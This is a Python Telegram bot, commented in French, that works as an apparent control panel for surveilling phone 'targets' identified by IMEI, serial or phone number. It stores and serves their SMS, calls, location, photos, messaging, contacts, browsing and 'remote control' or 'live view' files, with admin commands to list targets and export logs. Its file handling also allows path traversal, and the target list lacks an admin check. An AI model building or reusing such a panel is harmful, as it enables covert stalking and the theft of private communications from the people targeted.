# main.py (version corrigée)
import os
import logging
from datetime import datetime
from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    ConversationHandler,
    filters
)
import database
import file_manager
import report_generator
from config import BOT_TOKEN, ADMIN_IDS, DATA_PATH, DB_NAME

# Initialisation de la base de données
database.init_db(DB_NAME)

# Configuration des états de conversation
MAIN_MENU, CATEGORY_SELECTION, FILE_OPERATION = range(3)

# Configurez le logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Claviers réutilisables
def get_main_category_keyboard():
    return [
        ["📱 SMS/MMS", "📞 Appels", "📍 Localisation"],
        ["🖼️ Photos", "💬 Messageries", "🎙️ Contrôle à distance"],
        ["📺 Visualisation directe", "📁 Fichiers", "⏱ Restrictions"],
        ["📱 Applications", "🌐 Sites web", "📅 Calendrier"],
        ["👤 Contacts", "📊 Analyse", "📋 Retour"]
    ]

def get_admin_keyboard():
    return [
        ["📋 Liste des cibles", "🗑️ Supprimer une cible"],
        ["📈 Statistiques", "📤 Exporter les logs"],
        ["⬅️ Retour au menu principal"]
    ]

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Démarre la conversation et demande l'identifiant de l'appareil"""
    # Réinitialiser les données utilisateur
    context.user_data.clear()
    
    await update.message.reply_text(
        "🔍 Entrez un IMEI, numéro de série (SN) ou numéro de téléphone (format international) pour commencer.",
        reply_markup=ReplyKeyboardRemove()
    )
    return MAIN_MENU

async def handle_device_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la saisie de l'identifiant de l'appareil"""
    user_input = update.message.text.strip()
    user_id = update.effective_user.id
    
    if file_manager.validate_device_id(user_input):
        # Créer le dossier si nécessaire
        device_path = file_manager.create_device_folder(user_input)
        context.user_data['current_device'] = user_input
        
        # Menu interactif avec les catégories
        keyboard = get_main_category_keyboard()
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=False)
        
        await update.message.reply_text(
            f"✅ Dossier créé pour : {user_input}\nSélectionnez une catégorie :",
            reply_markup=reply_markup
        )
        return CATEGORY_SELECTION
    else:
        await update.message.reply_text(
            "❌ Format invalide. Veuillez entrer un IMEI (15 chiffres), SN (alphanumérique) ou numéro international (ex: +33612345678)."
        )
        return MAIN_MENU

async def handle_category_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la sélection de catégorie dans le menu interactif"""
    category = update.message.text
    device_id = context.user_data.get('current_device')
    
    # Gestion des commandes admin
    if category == "📋 Liste des cibles":
        return await list_targets(update, context)
    elif category == "🗑️ Supprimer une cible":
        await update.message.reply_text("Entrez /delete_target suivi de l'ID de la cible à supprimer")
        return CATEGORY_SELECTION
    elif category == "📈 Statistiques":
        await update.message.reply_text("Entrez /stats_target suivi de l'ID de la cible")
        return CATEGORY_SELECTION
    elif category == "📤 Exporter les logs":
        await update.message.reply_text("Entrez /export suivi de l'ID de la cible et du format (csv ou pdf)")
        return CATEGORY_SELECTION
    elif category == "⬅️ Retour au menu principal":
        return await start(update, context)
    
    # Mappage des catégories aux sous-dossiers
    category_map = {
        "📱 SMS/MMS": "sms_mms",
        "📞 Appels": "appels",
        "📍 Localisation": "localisations",
        "🖼️ Photos": "photos",
        "💬 Messageries": "messageries",
        "🎙️ Contrôle à distance": "controle_distance",
        "📺 Visualisation directe": "visualisation_directe",
        "📁 Fichiers": "fichiers",
        "⏱ Restrictions": "restrictions",
        "📱 Applications": "applications",
        "🌐 Sites web": "sites_web",
        "📅 Calendrier": "calendrier",
        "👤 Contacts": "contacts",
        "📊 Analyse": "analyse"
    }
    
    if category == "📋 Retour":
        await update.message.reply_text(
            "🔍 Entrez un nouvel identifiant (IMEI, SN ou numéro) :",
            reply_markup=ReplyKeyboardRemove()
        )
        return MAIN_MENU
    
    if category in category_map:
        context.user_data['current_category'] = category_map[category]
        category_path = os.path.join(DATA_PATH, device_id, category_map[category])
        
        # Créer le dossier de catégorie s'il n'existe pas
        os.makedirs(category_path, exist_ok=True)
        
        # Lister les fichiers disponibles
        files = file_manager.list_files(category_path)
        
        if files:
            file_keyboard = [[f] for f in files]
            file_keyboard.append(["⬅️ Retour aux catégories", "⬆️ Télécharger un fichier"])
            reply_markup = ReplyKeyboardMarkup(file_keyboard, resize_keyboard=True)
            
            await update.message.reply_text(
                f"📂 Fichiers disponibles dans {category}:\n"
                "Sélectionnez un fichier pour le visualiser ou téléchargez-en un nouveau.",
                reply_markup=reply_markup
            )
        else:
            reply_markup = ReplyKeyboardMarkup([["⬅️ Retour aux catégories", "⬆️ Télécharger un fichier"]], resize_keyboard=True)
            await update.message.reply_text(
                f"ℹ️ Aucun fichier dans {category}.\n"
                "Vous pouvez télécharger un fichier avec le bouton ci-dessous.",
                reply_markup=reply_markup
            )
        
        return FILE_OPERATION
    
    # Si aucune catégorie valide n'est sélectionnée
    keyboard = get_main_category_keyboard()
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text(
        "❌ Catégorie non reconnue. Veuillez réessayer.",
        reply_markup=reply_markup
    )
    return CATEGORY_SELECTION

async def handle_file_operation(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère les opérations sur les fichiers dans une catégorie"""
    user_choice = update.message.text
    device_id = context.user_data.get('current_device')
    category = context.user_data.get('current_category')
    category_path = os.path.join(DATA_PATH, device_id, category)
    
    if user_choice == "⬅️ Retour aux catégories":
        # Revenir au menu des catégories
        keyboard = get_main_category_keyboard()
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        await update.message.reply_text(
            f"Retour au menu des catégories pour {device_id}:",
            reply_markup=reply_markup
        )
        return CATEGORY_SELECTION
    
    elif user_choice == "⬆️ Télécharger un fichier":
        await update.message.reply_text(
            "⬆️ Envoyez le fichier que vous souhaitez télécharger dans cette catégorie.",
            reply_markup=ReplyKeyboardRemove()
        )
        return FILE_OPERATION
    
    else:
        # Traitement de la sélection d'un fichier
        file_path = os.path.join(category_path, user_choice)
        
        if os.path.isfile(file_path):
            # Journaliser la consultation
            file_manager.log_activity(DB_NAME, device_id, "CONSULT", file_path)
            
            # Envoyer le fichier à l'utilisateur
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=open(file_path, 'rb'),
                filename=user_choice
            )
            
            # Reafficher le menu des fichiers
            files = file_manager.list_files(category_path)
            file_keyboard = [[f] for f in files]
            file_keyboard.append(["⬅️ Retour aux catégories", "⬆️ Télécharger un fichier"])
            reply_markup = ReplyKeyboardMarkup(file_keyboard, resize_keyboard=True)
            
            await update.message.reply_text(
                "Sélectionnez une autre action:",
                reply_markup=reply_markup
            )
        else:
            await update.message.reply_text("❌ Fichier introuvable.")
        
        return FILE_OPERATION

async def handle_file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère le téléchargement de fichiers dans une catégorie"""
    device_id = context.user_data.get('current_device')
    category = context.user_data.get('current_category')
    category_path = os.path.join(DATA_PATH, device_id, category)
    
    if update.message.document:
        file = await context.bot.get_file(update.message.document.file_id)
        file_name = update.message.document.file_name
        
        # Sauvegarder le fichier
        file_path = os.path.join(category_path, file_name)
        await file.download_to_drive(file_path)
        
        # Journaliser l'upload
        file_manager.log_activity(DB_NAME, device_id, "UPLOAD", file_path)
        
        await update.message.reply_text(f"✅ Fichier {file_name} téléchargé avec succès dans {category}.")
        
        # Revenir à l'interface des fichiers
        files = file_manager.list_files(category_path)
        file_keyboard = [[f] for f in files]
        file_keyboard.append(["⬅️ Retour aux catégories", "⬆️ Télécharger un fichier"])
        reply_markup = ReplyKeyboardMarkup(file_keyboard, resize_keyboard=True)
        
        await update.message.reply_text(
            f"Opérations disponibles pour {category}:",
            reply_markup=reply_markup
        )
        return FILE_OPERATION
    
    await update.message.reply_text("❌ Format de fichier non reconnu. Veuillez envoyer un document.")
    return FILE_OPERATION

async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Affiche le panel d'administration"""
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Accès refusé.")
        return
    
    keyboard = get_admin_keyboard()
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    
    await update.message.reply_text(
        "🛠️ Panel Admin - Sélectionnez une option:",
        reply_markup=reply_markup
    )
    return CATEGORY_SELECTION

async def list_targets(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Affiche la liste des cibles enregistrées"""
    targets = file_manager.list_devices(DATA_PATH)
    
    if targets:
        response = "📋 Cibles enregistrées:\n" + "\n".join([f"- {t}" for t in targets])
    else:
        response = "ℹ️ Aucune cible enregistrée."
    
    await update.message.reply_text(response)
    
    # Reafficher le menu admin
    keyboard = get_admin_keyboard()
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text(
        "Sélectionnez une autre option:",
        reply_markup=reply_markup
    )
    return CATEGORY_SELECTION

async def delete_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Supprime une cible spécifique"""
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Accès refusé.")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /delete_target <id>")
        return
    
    target_id = context.args[0]
    if file_manager.delete_device_folder(target_id):
        database.delete_device(DB_NAME, target_id)
        await update.message.reply_text(f"✅ Cible {target_id} supprimée.")
    else:
        await update.message.reply_text(f"❌ Erreur lors de la suppression de {target_id}.")
    
    # Reafficher le menu admin
    keyboard = get_admin_keyboard()
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text(
        "Sélectionnez une autre option:",
        reply_markup=reply_markup
    )
    return CATEGORY_SELECTION

async def export_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Exporte les logs d'une cible spécifique"""
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Accès refusé.")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /export <id> [csv|pdf]")
        return
    
    target_id = context.args[0]
    format_type = context.args[1] if len(context.args) > 1 else "csv"
    
    try:
        if format_type == "csv":
            filename = report_generator.generate_csv(DB_NAME, target_id)
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=open(filename, 'rb'),
                filename=f"{target_id}_logs.csv"
            )
        elif format_type == "pdf":
            filename = report_generator.generate_pdf(DB_NAME, target_id)
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=open(filename, 'rb'),
                filename=f"{target_id}_report.pdf"
            )
        else:
            await update.message.reply_text("❌ Format non supporté. Utilisez 'csv' ou 'pdf'.")
            return
    except Exception as e:
        logger.error(f"Erreur lors de l'export: {str(e)}")
        await update.message.reply_text("❌ Erreur lors de la génération du rapport.")
    
    # Reafficher le menu admin
    keyboard = get_admin_keyboard()
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text(
        "Sélectionnez une autre option:",
        reply_markup=reply_markup
    )
    return CATEGORY_SELECTION

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Annule la conversation"""
    await update.message.reply_text(
        "Opération annulée. Tapez /start pour recommencer.",
        reply_markup=ReplyKeyboardRemove()
    )
    return ConversationHandler.END

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    """Gère les erreurs"""
    logger.error("Exception lors de la mise à jour du bot:", exc_info=context.error)
    
    if update and isinstance(update, Update):
        await update.message.reply_text(
            "❌ Une erreur s'est produite. Veuillez réessayer ou contacter l'administrateur."
        )

def run_bot():
    """Démarre le bot"""
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    
    # Gestionnaire de conversation principal
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            MAIN_MENU: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_device_id)
            ],
            CATEGORY_SELECTION: [
                MessageHandler(filters.Regex(r'^(📋 Liste des cibles|🗑️ Supprimer une cible|📈 Statistiques|📤 Exporter les logs|⬅️ Retour au menu principal)$'), admin_command),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_category_selection)
            ],
            FILE_OPERATION: [
                MessageHandler(filters.Document.ALL, handle_file_upload),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_file_operation)
            ]
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )
    
    # Commandes admin
    application.add_handler(CommandHandler('admin', admin_command))
    application.add_handler(CommandHandler('delete_target', delete_target))
    application.add_handler(CommandHandler('export', export_logs))
    application.add_handler(CommandHandler('stats_target', lambda u, c: u.message.reply_text("Fonctionnalité en développement")))
    application.add_handler(conv_handler)
    
    # Gestion des erreurs
    application.add_error_handler(error_handler)
    
    # Démarrer le bot
    logger.info("Bot démarré avec succès!")
    application.run_polling()

if __name__ == '__main__':
    run_bot()
